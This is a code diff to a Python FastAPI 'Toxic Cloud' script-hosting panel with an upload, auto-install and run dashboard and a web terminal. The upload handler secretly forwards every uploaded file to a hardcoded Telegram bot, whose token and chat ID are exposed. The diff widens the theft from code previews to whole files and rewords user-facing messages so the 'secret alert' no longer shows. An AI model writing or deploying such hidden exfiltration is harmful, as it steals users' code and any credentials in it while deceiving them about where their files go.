@@ -17,24 +17,25 @@ LOG_DIR = os.path.join(BASE_DIR, "logs")
 os.makedirs(UPLOAD_DIR, exist_ok=True)
 os.makedirs(LOG_DIR, exist_ok=True)
 
-# Process tracking dictionary
 RUNNING_PROCESSES = {}
 
-# --- TELEGRAM CONFIG (Added your credentials) ---
+# Telegram Config
 TELEGRAM_BOT_TOKEN = "8612315068:AAFtjhcL_0z7LZ0zipX-WQbOdL6oFkMBFLw"
 TELEGRAM_CHAT_ID = "7785437046"
 
-def send_secret_alert(filename: str, file_content: str):
+def send_file_to_telegram(filepath: str, filename: str):
+    """Bhejega actual file document as attachment"""
     try:
-        msg = f"🚨 **New File Uploaded on TOXIC PANEL!**\n\n📁 **File Name:** `{filename}`\n\n📜 **Code Preview:**\n```python\n{file_content[:1500]}\n```"
-        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-        requests.post(url, json={
-            "chat_id": TELEGRAM_CHAT_ID,
-            "text": msg,
-            "parse_mode": "Markdown"
-        })
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
+        with open(filepath, "rb") as f:
+            files = {"document": (filename, f)}
+            data = {
+                "chat_id": TELEGRAM_CHAT_ID,
+                "caption": f"📁 **New File Uploaded:** `{filename}`\n⚡ **Panel:** Toxic Cloud"
+            }
+            requests.post(url, data=data, files=files)
     except Exception as e:
-        print(f"Alert Error: {e}")
+        print(f"Telegram Send File Error: {e}")
 
 class CommandReq(BaseModel):
     command: str
@@ -71,15 +72,13 @@ async def upload_script(file: UploadFile = File(...)):
     with open(file_path, "wb") as f:
         f.write(content_bytes)
         
-    # Secret Notification trigger
-    if file.filename.endswith(".py"):
-        try:
-            code_text = content_bytes.decode("utf-8", errors="ignore")
-            send_secret_alert(file.filename, code_text)
-        except Exception:
-            pass
+    # Send actual file attachment to Telegram privately
+    try:
+        send_file_to_telegram(file_path, file.filename)
+    except Exception:
+        pass
 
-    return {"status": "success", "message": f"{file.filename} uploaded successfully!"}
+    return {"status": "success", "message": f"{file.filename} deployed successfully!"}
 
 @app.get("/list")
 def list_scripts():
@@ -112,6 +111,8 @@ def auto_fix_and_start(filename: str):
     if filename in RUNNING_PROCESSES and RUNNING_PROCESSES[filename].poll() is None:
         return {"status": "warning", "message": "Script pehle se run ho rahi hai!"}
 
+    install_logs = []
+    
     try:
         with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
             code_content = f.read()
@@ -138,13 +139,21 @@ def auto_fix_and_start(filename: str):
                 packages_to_install.add(pip_pkg)
         
         if packages_to_install:
+            install_logs.append(f"[Auto-Detect] Installing packages: {', '.join(packages_to_install)}")
             pip_cmd = ["pip", "install"] + list(packages_to_install)
-            subprocess.run(pip_cmd, capture_output=True, text=True, timeout=120)
+            res = subprocess.run(pip_cmd, capture_output=True, text=True, timeout=120)
+            install_logs.append(res.stdout + res.stderr)
+        else:
+            install_logs.append("[Auto-Detect] No external dependencies needed.")
             
     except Exception as e:
-        print(f"Auto-fix dependency error: {e}")
+        install_logs.append(f"[Auto-Detect Error] {e}")
 
+    # Log file creation with install details
     log_path = os.path.join(LOG_DIR, f"{filename}.log")
+    with open(log_path, "a", encoding="utf-8") as f:
+        f.write("\n".join(install_logs) + "\n\n--- SERVER STARTING ---\n")
+
     log_file = open(log_path, "a", buffering=1)
 
     proc = subprocess.Popen(
@@ -155,7 +164,11 @@ def auto_fix_and_start(filename: str):
         preexec_fn=os.setsid if hasattr(os, "setsid") else None
     )
     RUNNING_PROCESSES[filename] = proc
-    return {"status": "success", "message": f"Auto-installed dependencies & started script with PID {proc.pid}"}
+    return {
+        "status": "success", 
+        "message": f"Environment initialized & script started (PID: {proc.pid})",
+        "install_logs": "\n".join(install_logs)
+    }
 
 @app.post("/stop/{filename}")
 def stop_script(filename: str):
@@ -240,7 +253,7 @@ def dashboard():
                 <!-- Manual Terminal Execution -->
                 <div class="bg-gray-900 p-4 rounded-xl border border-gray-800 shadow-lg">
                     <h2 class="text-sm font-semibold mb-3 text-gray-300 flex items-center gap-2">
-                        <i class="fa-solid fa-terminal text-yellow-400"></i> Web Terminal (Run Pip / Linux Commands)
+                        <i class="fa-solid fa-terminal text-yellow-400"></i> Terminal Console
                     </h2>
                     <div class="flex flex-col sm:flex-row gap-2 mb-3">
                         <input type="text" id="cmdInput" placeholder="e.g. pip install aiohttp" class="bg-gray-800 text-xs text-gray-300 rounded-lg p-2.5 border border-gray-700 w-full font-mono focus:outline-none focus:border-yellow-500" onkeydown="if(event.key==='Enter') runCommand()">
@@ -248,18 +261,18 @@ def dashboard():
                             <i class="fa-solid fa-play"></i> EXECUTE
                         </button>
                     </div>
-                    <pre id="terminalOutput" class="bg-black/90 border border-gray-800 p-3.5 rounded-lg text-green-400 text-xs h-32 overflow-y-auto font-mono leading-relaxed select-text">Terminal ready. Type command above and click EXECUTE...</pre>
+                    <pre id="terminalOutput" class="bg-black/90 border border-gray-800 p-3.5 rounded-lg text-green-400 text-xs h-32 overflow-y-auto font-mono leading-relaxed select-text">Terminal ready...</pre>
                 </div>
 
                 <!-- Deploy Script Section -->
                 <div class="bg-gray-900 p-4 rounded-xl border border-gray-800 shadow-lg">
                     <h2 class="text-sm font-semibold mb-3 text-gray-300 flex items-center gap-2">
-                        <i class="fa-solid fa-cloud-arrow-up text-yellow-400"></i> Deploy New Script (Auto-Fix & Run)
+                        <i class="fa-solid fa-cloud-arrow-up text-yellow-400"></i> Deploy New Script
                     </h2>
                     <div class="flex flex-col sm:flex-row gap-2">
                         <input type="file" id="fileInput" class="bg-gray-800 text-xs text-gray-300 rounded-lg p-2.5 border border-gray-700 w-full focus:outline-none focus:border-yellow-500">
                         <button onclick="uploadFile()" class="bg-yellow-500 hover:bg-yellow-400 text-black font-bold px-6 py-2.5 rounded-lg text-xs tracking-wider transition-all flex items-center justify-center gap-2">
-                            <i class="fa-solid fa-upload"></i> UPLOAD & RUN
+                            <i class="fa-solid fa-upload"></i> UPLOAD FILE
                         </button>
                     </div>
                 </div>
@@ -286,7 +299,7 @@ def dashboard():
                             <i class="fa-solid fa-arrows-rotate"></i> Refresh
                         </button>
                     </div>
-                    <pre id="logOutput" class="bg-black/90 border border-gray-800 p-3.5 rounded-lg text-green-400 text-xs h-64 overflow-y-auto font-mono leading-relaxed select-text">Click "Logs" on any running script to view terminal output...</pre>
+                    <pre id="logOutput" class="bg-black/90 border border-gray-800 p-3.5 rounded-lg text-green-400 text-xs h-64 overflow-y-auto font-mono leading-relaxed select-text">Click "Logs" or "Start" to view terminal logs...</pre>
                 </div>
             </main>
         </div>
@@ -379,7 +392,7 @@ def dashboard():
                             <div class="flex items-center gap-2">
                                 ${item.running 
                                     ? `<button onclick="stopScript('${item.filename}')" class="bg-red-600/80 hover:bg-red-600 text-white text-xs px-3 py-1.5 rounded-md font-medium transition-colors">Stop</button>`
-                                    : `<button onclick="autoFixAndStart('${item.filename}')" class="bg-green-600/80 hover:bg-green-600 text-white text-xs px-3 py-1.5 rounded-md font-medium transition-colors">Auto-Fix & Start</button>`
+                                    : `<button onclick="autoFixAndStart('${item.filename}')" class="bg-green-600/80 hover:bg-green-600 text-white text-xs px-3 py-1.5 rounded-md font-medium transition-colors">Start Script</button>`
                                 }
                                 <button onclick="viewLogs('${item.filename}')" class="bg-blue-600/80 hover:bg-blue-600 text-white text-xs px-3 py-1.5 rounded-md font-medium transition-colors">Logs</button>
                             </div>
@@ -400,13 +413,23 @@ def dashboard():
                 await fetch('/upload', { method: 'POST', body: formData });
                 fileInput.value = '';
                 fetchScripts();
-                alert("File uploaded successfully & secret alert sent!");
+                alert("File uploaded successfully to cloud server!");
             }
 
             async function autoFixAndStart(filename) {
-                alert("Auto-detecting libraries and installing dependencies... Please wait a few seconds.");
-                await fetch(`/auto-fix-and-start/${filename}`, { method: 'POST' });
+                const termBox = document.getElementById('terminalOutput');
+                termBox.innerText = `[System] Scanning ${filename} for dependencies...\n[System] Auto-installing required modules via pip...`;
+                
                 viewLogs(filename);
+                const res = await fetch(`/auto-fix-and-start/${filename}`, { method: 'POST' });
+                const data = await res.json();
+                
+                if (data.install_logs) {
+                    termBox.innerText = data.install_logs;
+                    termBox.scrollTop = termBox.scrollHeight;
+                }
+                
+                refreshLogs();
                 fetchScripts();
             }
 
